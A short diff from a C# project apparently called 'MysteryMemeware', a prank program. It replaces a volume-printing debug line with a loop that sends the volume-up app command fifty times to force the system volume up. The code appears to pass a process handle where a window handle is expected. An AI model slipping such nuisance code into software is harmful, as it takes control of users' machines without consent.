@@ -7,8 +7,13 @@ namespace MysteryMemeware
     {
         public static void SetVolume()
         {
-            Console.WriteLine(AudioMixerHelper.GetVolume());
-            Console.ReadLine();
+            System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
+            for (int i = 0; i < 50; i++)
+            {
+                SendMessage(processHandle, 793, processHandle, 655360);
+            }
+            System.Threading.Thread.Sleep(5000);
+            return;
             /*System.Threading.Thread childThread = new System.Threading.Thread(() =>
             {
                 System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
